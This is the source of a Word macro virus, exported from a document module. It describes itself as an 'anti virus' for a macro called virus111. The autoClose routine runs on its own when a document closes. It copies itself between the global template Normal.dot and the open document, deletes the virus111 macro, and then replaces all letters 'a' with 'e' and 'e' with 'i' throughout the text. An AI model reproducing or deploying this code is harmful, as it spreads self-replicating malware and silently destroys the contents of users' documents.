   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "autoClose"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "VirusMacroWord - Bureau Informatique - SIRPA\r\nVirus Anti Virus de la macro virus111\r\n(c) Sgt THERY - version 0.1b"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.autoClose.MAIN"
   Dim fichier$
   Dim model$
   Dim Macro$
   On Error GoTo -1: On Error GoTo 0
   WordBasic.FileSummaryInfo Update:=1
   Dim res As Object: Set res = WordBasic.DialogRecord.FileSummaryInfo(False)
   WordBasic.CurValues.FileSummaryInfo res
   fichier$ = res.Directory + "\" + res.FileName + ":autoClose"
   model$ = "Global:autoClose"
   Macro$ = WordBasic.[MacroFileName$](WordBasic.[MacroName$](0))
   If UCase(WordBasic.[Right$](Macro$, 10)) = "NORMAL.DOT" Then
   WordBasic.MacroCopy model$, fichier$
   WordBasic.FileSaveAs Format:=1
   Else
   WordBasic.MacroCopy fichier$, model$
   End If
   WordBasic.ToolsMacro Name:="virus111", Show:=0, Delete:=1
   WordBasic.EditReplace Find:="a", Replace:="e", Direction:=0, MatchCase:=0, WholeWord:=0, PatternMatch:=0, SoundsLike:=0, ReplaceAll:=1, Format:=0, Wrap:=1, FindAllWordForms:=0
   WordBasic.EditReplace Find:="e", Replace:="i", Direction:=0, MatchCase:=0, WholeWord:=0, PatternMatch:=0, SoundsLike:=0, ReplaceAll:=1, Format:=0, Wrap:=1, FindAllWordForms:=0
   End Sub
